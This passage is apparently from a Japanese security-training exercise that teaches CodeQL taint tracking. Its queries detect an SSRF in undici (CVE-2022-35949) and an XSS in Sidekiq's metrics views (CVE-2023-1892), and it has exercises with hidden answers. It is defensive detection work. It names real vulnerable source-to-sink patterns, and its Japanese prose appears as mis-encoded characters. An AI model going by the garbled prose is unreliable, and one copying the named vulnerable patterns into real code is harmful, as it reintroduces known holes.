`Buffer.allocUnsafe(...)` ã® `allocUnsafe` ã‚’æŠ¼ã™ã¨ã€AST ViewerãŒè©²å½“ã®ãƒãƒ¼ãƒ‰ã‚’è¡¨ç¤ºã—ã¦ãã‚Œã¾ã™ã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_f6a7a5031156f909c235313a2540a8cd.png)

ã“ã‚“ãªæ§‹é€ ã«ãªã£ã¦ã„ã‚‹ã¨æ€ã„ã¾ã™

```
[MethodCallExpr] Buffer. ... IPILER)
 |--[DotExpr] Buffer.allocUnsafe
 |    |--[VarRef] Buffer
 |    L--[Label] allocUnsafe
 L--(Arguments)
```

`MethodCallExpr` ã¯ãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—ã‚’æŒ‡ã™ASTãƒãƒ¼ãƒ‰ã§ã™ã€‚

ãã®ä¸‹ã«2ã¤å­ãƒãƒ¼ãƒ‰ãŒã¶ã‚‰ä¸‹ãŒã£ã¦ã„ã‚‹ã¨æ€ã„ã¾ã™ã€‚
(ãƒ„ãƒªãƒ¼æ§‹é€ ãªã®ã§ã€ `MethodCallExpr` ã‚’è¦ªãƒãƒ¼ãƒ‰ã€ ãã®ä¸‹ã®2ã¤ã‚’å­ãƒãƒ¼ãƒ‰ã¨è¡¨ç¾ã—ã¾ã™ã€‚)

1ã¤ç›®ãŒãƒ¡ã‚½ãƒƒãƒ‰ `Buffer.allocUnsafe` ã«å½“ãŸã‚‹ `DotExpr` ã¨ã„ã†ASTãƒãƒ¼ãƒ‰ã§ã€ã€€ã“ã‚Œã‚‚ã¾ãŸ`VarRef`ã€€ã¨ `Label` ã®å­ãƒãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã™ã€‚
2ã¤ç›®ãŒãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—ã®å¼•æ•°éƒ¨åˆ†ã‚’è¡¨ã™ASTãƒãƒ¼ãƒ‰ã«ãªã‚Šã¾ã™ã€‚

AST Viewerã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãªãŒã‚‰è¦‹ã¦ã¿ã‚‹ã¨åˆ†ã‹ã‚Šã‚„ã™ã„ã‹ã‚‚ã€‚

[CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides/)ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªåˆ¥ã«æ§‹æ–‡ã«å¯¾å¿œã™ã‚‹ASTãƒãƒ¼ãƒ‰ã®ä¸€è¦§è¡¨ãŒã‚ã‚‹ã®ã§ã€å›°ã£ãŸã¨ãã¯ã“ã“ã‚’å‚ç…§ã€‚
- [JavaScript/TypeScript](https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-javascript-and-typescript-programs/)
- [Ruby](https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-ruby-programs/)
- [Java/Kotlin](https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/)


æœ¬é¡Œã«æˆ»ã‚‹ã¨ã€ `from MethodCallExpr e` ã¨ã„ã†ã®ã¯ã€ãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—ã®ASTãƒãƒ¼ãƒ‰ã®å®£è¨€ã¨ã„ã†ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

#### `where e.getMethodName() = "allocUnsafe"`

`e.getMethodName()` ã¯ `MethodCallExpr` ã®ãƒ¡ã‚½ãƒƒãƒ‰åéƒ¨åˆ†ã‚’å–ã£ã¦ãã‚‹è¿°èªï¼ˆé–¢æ•°ã¿ãŸã„ãªã‚‚ã®ï¼‰ã§ã™ã€‚

ã“ã®whereæ–‡ã«ã‚ˆã£ã¦ã€ `e` ãŒ `allocUnsafe` ãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—ã®ã¿ã«é™å®šã•ã‚Œã¾ã™ã€‚

#### å†åº¦ç¢ºèª

ã“ã®ã‚¯ã‚¨ãƒªã§ã€ `allocUnsafe` ãƒ¡ã‚½ãƒƒãƒ‰ã®å‘¼ã³å‡ºã—ã‚’æŠ½å‡ºã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸã§ã—ã‚‡ã†ã‹ï¼Ÿ
ï¼ˆã“ã®ã‚¯ã‚¨ãƒªã ã¨ãƒ¡ã‚½ãƒƒãƒ‰åãŒ `allocUnsafe` ã§ã‚ã‚Œã°ãªã‚“ã§ã‚‚å‡ºã¦ãã¦ã—ã¾ã†ã®ã§ã€ `Buffer.allocUnsafe` ã‚’æ¢ã—ãŸã„å ´åˆã«ã¯ã‚‚ã†å°‘ã—ã‚¯ã‚¨ãƒªã‚’æ›¸ãå¿…è¦ãŒã‚ã‚Šã¾ã™ãŒï¼‰

```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

â€»è©¦ã™å ´åˆã€ã‚¯ã‚¨ãƒªå®Ÿè¡Œå¯¾è±¡ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ã€Œai/nanoidã€ãŒé¸æŠã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª!

![](https://tyage.github.io/seccamp-2023-images/upload_afa7fa983c5f6500c4bdbc56f5ced435.png)

ã“ã®ã‚ˆã†ã«ã—ã¦ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã‚„å¤‰æ•°ã®å®£è¨€ã€æ§‹æ–‡ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
ï¼ˆä»Šå›ã¯VS Codeä¸Šã§ç¢ºèªã—ã¦ã„ã¾ã™ãŒã€SARIFã¨ã„ã†é™çš„è§£æçµæœç”¨ã®æ¨™æº–å‡ºåŠ›ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã§ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãå‡ºã™ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ï¼‰

ãŒã€Taint Trackingã‚’è¡Œã†ã«ã¯DataFlowã¨ã„ã†ä»•çµ„ã¿ã‚’åˆ©ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
DataFlowã‚’åˆ©ç”¨ã—ã¦ã€å‰åŠã§èª¿æŸ»ã—ãŸCVEã‚’æ¤œçŸ¥ã™ã‚‹ã‚¯ã‚¨ãƒªã‚’æ›¸ã„ã¦ã¿ã‚ˆã†ã€‚

# CodeQLå®Ÿè·µç·¨

## (JavaScript) CVE-2022-35949

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã“ã¡ã‚‰ã§ä½œæˆã—ãŸã‚‚ã®ãŒã‚ã‚‹ã®ã§ã€ãã‚Œã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„ã€‚
https://drive.google.com/file/d/1z7M_zgaaop7cQGhJDqueqDuC448hSLFB/view?usp=sharing

`new URL` ã‚’åˆ©ç”¨ã—ãŸSSRFãŒç™ºç”Ÿã™ã‚‹ç®‡æ‰€ã‚’ç‰¹å®šã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ãã®ãŸã‚ã«ã€CodeQLã§Taint Trackingã‚’ã‚„ã£ã¦ã„ãã¾ã™ã€‚


ä»¥ä¸‹ã®JavaScriptç”¨Taint Trackingãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’åˆ©ç”¨ã™ã‚‹ã¨å‡ºåŠ›ãŒã„ã„æ„Ÿã˜ã«ãªã£ã¦ä¾¿åˆ©ã§ã™ã€‚(ã‚³ãƒ¡ãƒ³ãƒˆã‚‚é‡è¦ãªã®ã§æ¶ˆã•ãªã„ã§ï¼)

```javascript
/**
 * @kind path-problem
 */
import javascript
import DataFlow
import DataFlow::PathGraph

class MyConfig extends TaintTracking::Configuration {
  MyConfig() { this = "MyConfig" }
  override predicate isSource(Node node) { ... }
  override predicate isSink(Node node) { ... }
}

from MyConfig cfg, PathNode source, PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "taint from $@.", source.getNode(), "here"
```

å„ãƒ‘ãƒ¼ãƒ„ã‚’ã–ã£ãã‚Šã¨èª¬æ˜ã™ã‚‹ã¨

- `class MyConfig extends TaintTracking::Configuration {`
    - Taint Trackingç”¨ã®è¨­å®šã‚’è¨˜è¿°ã™ã‚‹ã‚¯ãƒ©ã‚¹
- `override predicate isSource(Node node) { ... }`
    - å¼•æ•° `node` ãŒã‚½ãƒ¼ã‚¹ğŸš°ã§ã‚ã‚‹ã‹åˆ¤æ–­ã™ã‚‹predicate(è¿°èª)
    - predicate = ã»ã¼é–¢æ•°ã¿ãŸã„ãªã‚‚ã®
        - returnæ–‡ãŒç„¡ã„ä»£ã‚ã‚Šã«ã€ `result = ...` ã¨ã™ã‚‹ã¨ãã‚ŒãŒè¿”ã‚Šå€¤ã«ãªã‚‹
- `override predicate isSink(Node node) { ... }`
    - å¼•æ•° `node` ãŒã‚·ãƒ³ã‚¯ğŸª£ã§ã‚ã‚‹ã‹åˆ¤æ–­ã™ã‚‹predicate(è¿°èª)

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã® `...` ã«é©åˆ‡ãªè«–ç†æ¡ä»¶ã‚’æ›¸ã„ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

å¤§ããªæ³¨æ„ç‚¹ã¨ã—ã¦ã€Taint Trackingã§æ‰±ã† `node` ã¯AST Nodeã¨ã¯åˆ¥ã®DataFlowãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®Nodeã‚¯ãƒ©ã‚¹ã§ã™ã€‚
DataFlow Nodeã¯ `.asExpr()` ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§AST Nodeã¸å¤‰æ›ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ãŒã€DataFlowãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ç”¨æ„ã•ã‚Œã¦ã„ã‚‹ã‚¯ãƒ©ã‚¹ã§è¡¨ç¾ã§ãã‚‹å ´åˆã«ã¯ãã®ã»ã†ãŒã„ã„ã§ã—ã‚‡ã†ã€‚
(ã•ã‚‰ã«æ··ä¹±ã™ã‚‹ãƒã‚¤ãƒ³ãƒˆã¨ã—ã¦ã€DataFlow Node -> AST Nodeã¸ã®å¤‰æ›æ–¹æ³•ã¯è¨€èªã«ã‚ˆã£ã¦é•ã„ã¾ã™ã€‚)

[Data flow cheat sheet for JavaScript](https://codeql.github.com/docs/codeql-language-guides/data-flow-cheat-sheet-for-javascript/)

### existsæ§‹æ–‡

ã¾ãšã¯ `isSink` ã®å†…å®¹ã‹ã‚‰è€ƒãˆã¦ã¿ã¾ã—ã‚‡ã†ã€‚

`node` ã¯ `new URL(...)` ã®ç¬¬ä¸€å¼•æ•°ã«ãªã£ã¦ã»ã—ã„ã®ã§ã€ `new XXXX` ã‚’è¡¨ã™ `NewNode` ã‚’åˆ©ç”¨ã™ã‚‹ã¨ã†ã¾ãè¡¨ç¾ã§ããã†ã§ã™ã€‚
( [NewNode](https://codeql.github.com/codeql-standard-libraries/javascript/semmle/javascript/dataflow/Nodes.qll/type.Nodes$NewNode.html) ã¯ AST Node ã§ã¯ãªã DataFlowãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã® Nodeã§ã™ã€‚ )

å…ˆç¨‹ã¾ã§ã® from ... select æ§‹æ–‡ã‚’ç”¨ã„ã¦ `node` ã®å€™è£œã‚’æŠ½å‡ºã™ã‚‹æ§‹æ–‡ã¯ã“ã†æ›¸ã‘ã‚‹ã¨æ€ã„ã¾ã™ã€‚

```javascript
from NewNode newNode
where newNode.getCalleeName() = "URL"
select newNode.getArgument(0)
```

predicateå†…ã§ `node` ã‚’æŸç¸›ã™ã‚‹ã«ã¯ã©ã†ã—ãŸã‚‰ã„ã„ã§ã—ã‚‡ã†ã‹ï¼Ÿ

ã“ã“ã§ã€ `exists(å¤‰æ•°å®£è¨€ | æ¡ä»¶)` ã¨ã„ã†æ§‹æ–‡ãŒç™»å ´ã—ã¾ã™ã€‚

ã“ã‚Œã‚’ä½¿ã†ã¨å¤‰æ•°å®£è¨€éƒ¨åˆ†ã§å®£è¨€ã—ãŸå¤‰æ•°ã‚’ç”¨ã„ã¦ã€æ¡ä»¶ãŒæˆç«‹ã™ã‚‹ã‚‚ã®ãŒã‚ã‚‹ã‹ã©ã†ã‹èª¿ã¹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
å…ˆç¨‹ã® from ... select æ–‡ã‚’æ€ã„å‡ºã—ãªãŒã‚‰æ›¸ã„ã¦ã¿ã‚‹ã¨ã€ã“ã†æ›¸ãã“ã¨ãŒã§ãã¾ã™ã€‚

```javascript
...
  // ... ã®ã¾ã¾ã ã¨æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ã«ãªã‚‹ã®ã§ã€ä»»æ„ã®å€¤ã‚’è¡¨ã™ any() ã‚’ã¨ã‚Šã‚ãˆãšå…¥ã‚Œã¦ãŠãã¾ã™
  override predicate isSource(Node node) { any() }

  override predicate isSink(Node node) {
    exists(NewNode new |
      node = new.getArgument(0) and // node = new XXXX(...)
      new.getCalleeName() = "URL" // XXXX = "URL"
    )
  }
...
```

`Quick Evaluation: isSink` ã‚’æŠ¼ã—ã¦ã¿ã‚‹ã¨ `new URL` ã®å¼•æ•°ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚
ã“ã‚Œã§ `node` = `new URL(...)` ã®ç¬¬ä¸€å¼•æ•°ã¨ãªã‚Šã¾ã—ãŸã€‚

### èª²é¡Œ4: ã‚·ãƒ³ã‚¯ğŸª£ã‚’æ”¹è‰¯ã—ã¦ã¿ã‚ˆã†
å˜ã« `new URL(url)` ãŒå‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ç®‡æ‰€ã¯ã€æ„å›³ã—ãªã„originã®ä¸Šæ›¸ããŒç™ºç”Ÿã—ãªã„ã®ã§ã‚·ãƒ³ã‚¯ğŸª£ã¨ã—ã¦ã¯ã‚ã¾ã‚Šé©åˆ‡ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
`new URL(param, origin)` ã®ã‚ˆã†ã«ç¬¬ä¸€å¼•æ•°ã«å¤–éƒ¨å…¥åŠ›å€¤ãŒå…¥ã‚Šã€ç¬¬äºŒå¼•æ•°ã‚‚è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã‚’æ¢ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚


<details>
<summary>ç­”ãˆ</summary>


```javascript
  override predicate isSink(Node node) {
    exists(NewNode new |
      node = new.getArgument(0) and // node = new XXXX(...)
      new.getCalleeName() = "URL" and // XXXX = "URL"
      new.getNumArgument() > 1
     )
  }
```

åˆ¥è§£

```javascript
    exists(NewNode new, Node arg2 |
      node = new.getArgument(0) and // node = new XXXX(..., YYYY)
      new.getCalleeName() = "URL" and // XXXX = "URL"
      new.getArgument(1) = arg2 // YYYY = arg2
    )
```
</details>


### èª²é¡Œ5: ã‚½ãƒ¼ã‚¹ğŸš°ã‚’æ›¸ã„ã¦ã¿ã‚ˆã†

`isSource` ã«ã¤ã„ã¦ã‚‚åŒæ§˜ã«å®šç¾©ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

æœ¬æ¥ã§ã‚ã‚Œã° `request({ opts: req.params... })` ã®ã‚ˆã†ãªå¤–éƒ¨å…¥åŠ›ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ã‚½ãƒ¼ã‚¹ğŸš°ã¨ã™ã¹ãã§ã™ãŒã€ã“ã“ã§ã¯ç°¡ç•¥åŒ–ã—ã¦ã€undiciã® `index.js` ã®37è¡Œç›®ã§å®šç¾©ã•ã‚Œã¦ã‚‹ã‚¢ãƒ­ãƒ¼é–¢æ•°ã®å¼•æ•°ã€ `url` ã¨ `opts` ã‚’ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå¤–éƒ¨ã‹ã‚‰ä¸ãˆã‚‰ã‚Œã‚‹ä¿¡é ¼ã§ããªã„å€¤ã¨ã—ã¦ã‚½ãƒ¼ã‚¹ğŸš°ã«è¨­å®šã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

https://github.com/nodejs/undici/blob/124f7ebf705366b2e1844dff721928d270f87895/index.js#L37

ä»»æ„ã®é–¢æ•°ã®å¼•æ•°å `url` ã‚‚ã—ãã¯ `opts` ãŒã‚½ãƒ¼ã‚¹ğŸš°ã¨ãªã‚‹ã‚ˆã†ã« `isSource` ã«æ¡ä»¶ã‚’è¨­å®šã—ã¦ã¿ã¦ãã ã•ã„ã€‚
`Quick Evaluation: isSource` ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ `114 results` ãŒè¿”ã£ã¦ãã‚Œã°æ­£è§£ã§ã™ã€‚

ãƒ’ãƒ³ãƒˆ1: é–¢æ•°ã‚’è¡¨ã™Nodeã¨ã—ã¦[FunctionNode](https://codeql.github.com/codeql-standard-libraries/javascript/semmle/javascript/dataflow/Nodes.qll/type.Nodes$FunctionNode.html)ãŒå­˜åœ¨ã—ã¾ã™ã€‚
ãƒ’ãƒ³ãƒˆ2: `FunctionNode`ã«ã¯`getParameter`ã‚„`getParameterByName`ã®ã‚ˆã†ãªé–¢æ•°ã®å¼•æ•°ã‚’å–å¾—ã™ã‚‹è¿°èªãŒã‚ã‚Šã¾ã™ã€‚

<details>
<summary>ç­”ãˆ</summary>

```javascript
/**
 * @kind path-problem
 */

import javascript
import DataFlow
import DataFlow::PathGraph

class MyConfig extends TaintTracking::Configuration {
  MyConfig() { this = "MyConfig" }

  override predicate isSource(Node node) {
    exists(FunctionNode f |
      f.getParameterByName("opts") = node or
      f.getParameterByName("url") = node
    )
  }

  override predicate isSink(Node node) {
    exists(NewNode new |
      new.getArgument(0) = node and
      new.getCalleeName() = "URL" and
      new.getNumArgument() > 1
    )
  }
}

from MyConfig cfg, PathNode source, PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "taint from $@.", source.getNode(), "here"
```

</details>

### Taint Trackingã‚’ã‚„ã£ã¦ã¿ã‚ˆã†

å®Œæˆã—ãŸã‚¯ã‚¨ãƒªã‚’èµ°ã‚‰ã›ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã‚½ãƒ¼ã‚¹ğŸš°ã‹ã‚‰ã‚·ãƒ³ã‚¯ğŸª£ã¾ã§ã®ãƒ•ãƒ­ãƒ¼ãŒå­˜åœ¨ã™ã‚‹ã‚‚ã®ã ã‘ãŒæŠ½å‡ºã•ã‚Œã€Query Resultã§ãƒ•ãƒ­ãƒ¼ã‚’è¿½ã†ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã¯ãšã§ã™ã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_979e9c158bb23a57d509bac5b45091d5.png)


## (Ruby) CVE-2023-1892

é™çš„è§£æã®ãƒ‘ãƒ¼ãƒˆã§Sidekiqã®XSS(CVE-2023-1892)ã«ã¤ã„ã¦ã®ã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ãŒåˆ†ã‹ã£ãŸã®ã§CodeQLã®ã‚¯ã‚¨ãƒªã‚’ä½œæˆã—ã¦æ¤œçŸ¥ã—ã¦ã¿ã‚ˆã†

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«
https://drive.google.com/file/d/1Y6MGyRP2jnu6h8WR14ZmZyBszEqa6OP3/view?usp=drive_link

### èª²é¡Œ6: ã‚¯ã‚¨ãƒªã‚’å®Ÿè£…ã—ã¦ã¿ã‚ˆã†

æ§‹æ–‡ã®ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹
https://codeql.github.com/docs/ql-language-reference/

ã‚½ãƒ¼ã‚¹: `params[:period]`
ã‚·ãƒ³ã‚¯: `<%= @period %>`

ã‚½ãƒ¼ã‚¹ã‚’æŠ½å‡ºã™ã‚‹ã‚¯ã‚¨ãƒªã‚’æ›¸ãã¾ãˆã«ã‚½ãƒ¼ã‚¹ã®ãƒãƒ¼ãƒ‰ã«ã¤ã„ã¦èª¿ã¹ã‚‹

sidekiq/lib/sidekiq/web/application.rbã«å¯¾ã—ã¦å³ã‚¯ãƒªãƒƒã‚¯ > CodeQL: View ASTã‚’å®Ÿè¡Œã™ã‚‹ã¨ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ASTã«ã¤ã„ã¦èª¿ã¹ã‚‹ã“ã¨ãŒã§ãã‚‹

![](https://tyage.github.io/seccamp-2023-images/upload_594555d3f0d274e229413ee4fe0d164b.png)

![](https://tyage.github.io/seccamp-2023-images/upload_1817d4914e66c31fcc6e6a15573309ee.png)

`params[:period]`ã¯`ElementReference`ãƒãƒ¼ãƒ‰ã§ã‚ã‚Šã€ã•ã‚‰ã«ãã®ä¸‹ã®paramsã¯MethodCallãƒãƒ¼ãƒ‰ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹
![](https://tyage.github.io/seccamp-2023-images/upload_a57066f2ce385e2bc77b21b47d44cc11.png)

ã¡ãªã¿ã«rubyã®AST viewerã¯è¦ªãƒãƒ¼ãƒ‰ã‹ã‚‰å­ãƒãƒ¼ãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚ã‹ã‚‹
```
getStmt: [ClassDeclaration] WebApplication
 L-- getStmt: [MethodCall] call to extend
  L-- getStmt: [AssignExpr] ... = ...
```

```
import ruby
import codeql.ruby.AST

from ClassDeclaration cd

where cd.getName() = "WebApplication"
select cd, cd.getStmt(0)
```

![](https://tyage.github.io/seccamp-2023-images/upload_a00cb24aa1a897759db8c137ec5dd734.png)


```
import ruby
import codeql.ruby.AST

from ElementReference ref, MethodCall call
where ref.getReceiver() = call and
    call.getMethodName() = "params" 
select call, call.getMethodName()
```

![](https://tyage.github.io/seccamp-2023-images/upload_b72445d34b9db2c0fada2b8ca9f4c4d2.png)

åŒã˜è¦é ˜ã§ã‚·ãƒ³ã‚¯ã‚’æŠ½å‡ºã™ã‚‹ã‚¯ã‚¨ãƒªã‚’ä½œæˆã™ã‚‹

ä»¥ä¸‹ã®ç‚¹ã‚’è¸ã¾ãˆã¦ã‚¯ã‚¨ãƒªã‚’ä½œæˆ
ãƒ»ã‚·ãƒ³ã‚¯ã¯erbã®å‡ºåŠ›ç®‡æ‰€(`<%= %>`)
ãƒ»`@period`(InstanceVariableAccessãƒãƒ¼ãƒ‰)ãŒå‡ºåŠ›å¯¾è±¡

erbã®å‡ºåŠ›ç®‡æ‰€ã¯ErbOutputDirectiveã‚’ä½¿ã†ã¨è‰¯ã„
https://codeql.github.com/codeql-standard-libraries/ruby/codeql/ruby/ast/Erb.qll/type.Erb$ErbOutputDirective.html

```
import ruby
import codeql.ruby.AST

from ErbOutputDirective erbOutputDirective

where erbOutputDirective.getTerminalStmt() instanceof InstanceVariableAccess
select erbOutputDirective
```

![](https://tyage.github.io/seccamp-2023-images/upload_985828f66fc68189c3c3109628c84aa4.png)

ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã‚·ãƒ³ã‚¯ã¾ã§ã®ãƒ‡ãƒ¼ã‚¿ã®æµã‚Œã‚’æ¤œçŸ¥ã™ã‚‹ãŸã‚ã«ã¯`TaintTracking::Configuration`ã‚’ç¶™æ‰¿ã—ãŸã‚¯ãƒ©ã‚¹ã‚’å®šç¾©ã™ã‚‹

```
/**
 * @kind path-problem
 */
import ruby
import codeql.ruby.AST
import codeql.ruby.DataFlow
import codeql.ruby.TaintTracking
import DataFlow::PathGraph

class Configuration extends TaintTracking::Configuration {

  // å¼•æ•°ã®ãƒãƒ¼ãƒ‰ãŒã‚½ãƒ¼ã‚¹ã¨ãªã‚‹ã‚ˆã†ã«å®Ÿè£…
  override predicate isSource(DataFlow::Node source) {
    // ã‚½ãƒ¼ã‚¹ã‚’å®šç¾©
  }
    
  // å¼•æ•°ã®ãƒãƒ¼ãƒ‰ãŒã‚·ãƒ³ã‚¯ã¨ãªã‚‹ã‚ˆã†ã«å®Ÿè£…
  override predicate isSink(DataFlow::Node sink) {
    // ã‚·ãƒ³ã‚¯ã‚’å®šç¾©
  }

}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected CVE-2023-1892!"

```

ã“ã‚Œã¾ã§å®Ÿè£…ã—ãŸã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ã®ã‚¯ã‚¨ãƒªã‚’ãã‚Œãã‚Œã®ãƒ¡ã‚½ãƒƒãƒ‰ã§å®Ÿè£…ã—ã¦ã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ã‚’ç‰¹å®šã—ã‚ˆã†
ã€ŒQuick Evaluation: isSourceã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ãã®ãƒ¡ã‚½ãƒƒãƒ‰ã ã‘å®Ÿè¡Œã§ãã‚‹ã®ã§æ´»ç”¨ã—ã‚ˆã†

![](https://tyage.github.io/seccamp-2023-images/upload_40e83426b9827184107c2a410d7e0afa.png)

```
class Configuration extends TaintTracking::Configuration {
  Configuration() { this = "CVE-2023-1892" }

  /*
    sidekiq/lib/sidekiq/web/application.rb:71
    @period = params[:period]

    sidekiq/lib/sidekiq/web/application.rb:80
    @period = params[:period]
  */
  override predicate isSource(DataFlow::Node source) {
    exists(ElementReference ref |
      ref.getReceiver().(MethodCall).getMethodName() = "params" and // params[:period]
      source.asExpr().getExpr() = ref // source: params[:period]
    )
  }

  /*
    sidekiq/web/views/metrics.erb:65
    <%= @period %>

    sidekiq/web/views/metrics_for_job.erb:65
    <%= @period %>
  */
  override predicate isSink(DataFlow::Node sink) {
    exists(ErbOutputDirective erb |
      sink.asExpr().getExpr() = erb.getTerminalStmt() // <%= @period<-ã‚³ã‚³ %>
    )
  }

}
```

ãŸã ã—ã€ã“ã®ã¾ã¾ã ã¨erb(:metrics_for_job)ãªã©ã®controllerã‹ã‚‰view(erbãƒ•ã‚¡ã‚¤ãƒ«)ã«å¯¾ã™ã‚‹ãƒ•ãƒ­ãƒ¼ãŒç„¡ã„ãŸã‚æ¤œçŸ¥ã§ããªã„ã€‚

ãã®ãŸã‚ã€`isAdditionalTaintStep()`ã§controllerã‹ã‚‰viewã¸ã®ãƒ•ãƒ­ãƒ¼ã‚’å®šç¾©ã™ã‚‹
isAdditionalTaintStepã§ã¯node1, node2ã®ã‚ˆã†ã«å¼•æ•°ã‚’äºŒã¤å–ã‚Šã€node1ã‹ã‚‰node2ã«å¯¾ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ•ãƒ­ãƒ¼ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒã§ãã‚‹

ã¾ãšã¯åºƒã„ç¯„å›²ã‚’æŒ‡å®šã—ã¦å–å¾—ã—ã¦ã„ãã€ã ã‚“ã ã‚“ã¨ã‚¹ã‚³ãƒ¼ãƒ—ã‚’çµã£ã¦ã„ãã¨ä½œã‚Šã‚„ã™ã„ã‹ã‚‚


<details>
<summary>!!Spoiler Alert!!</summary>

å®Ÿè£…ä¸€ä¾‹
```
  // @period = params[:method]
  Expr variableAssignValue(string name) {
    exists(InstanceVariableAccess var, AssignExpr assignExpr |
      result = assignExpr and // node1: @period = params[:method]
      assignExpr.getLeftOperand() = var and // @period = ...
      var.getVariable().getName() = name // @period ã® name
    )
  }

  // <%= name %>
  InstanceVariableAccess erbOutputVariable(string name) {
    exists(ErbOutputDirective output |
      result.getVariable().getName() = name and // @period ã®name
      output.getTerminalStmt() = result // <%= @period %>
    )
  }
  /*
    (node1)params[:period] -> (node2) <%= @period<-ã“ã‚Œ %>
  */
  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {
    exists(string name |
      node1.asExpr().getExpr() = variableAssignValue(name) and // node1: params[:period]
      node2.asExpr().getExpr() = erbOutputVariable(name) // node2: <%= @period<-ã“ã‚Œ %>
    )
  }
```


```
/**
 * @kind path-problem
 */

import ruby
import codeql.ruby.AST
import codeql.ruby.DataFlow
import codeql.ruby.TaintTracking
import DataFlow::PathGraph


class Configuration extends TaintTracking::Configuration {
  Configuration() { this = "CVE-2023-1892" }

  /*
    sidekiq/lib/sidekiq/web/application.rb:71
    @period = params[:period]

    sidekiq/lib/sidekiq/web/application.rb:80
    @period = params[:period]
  */
  override predicate isSource(DataFlow::Node source) {
    exists(ElementReference ref |
      ref.getReceiver().(MethodCall).getMethodName() = "params" and // params[:period]
      source.asExpr().getExpr() = ref // source: params[:period]
    )
  }

  /*
    sidekiq/web/views/metrics.erb:65
    <%= @period %>

    sidekiq/web/views/metrics_for_job.erb:65
    <%= @period %>
  */
  override predicate isSink(DataFlow::Node sink) {
    exists(ErbOutputDirective erb |
      sink.asExpr().getExpr() = erb.getTerminalStmt() // <%= @period<-ã‚³ã‚³ %>
    )
  }

  // @period = ã‚³ã‚³
  Expr variableAssignValue(string name) {
    exists(InstanceVariableAccess var, AssignExpr assignExpr |
      result = assignExpr.getRightOperand() and // node1: @period = ã‚³ã‚³
      assignExpr.getLeftOperand() = var and // @period = ...
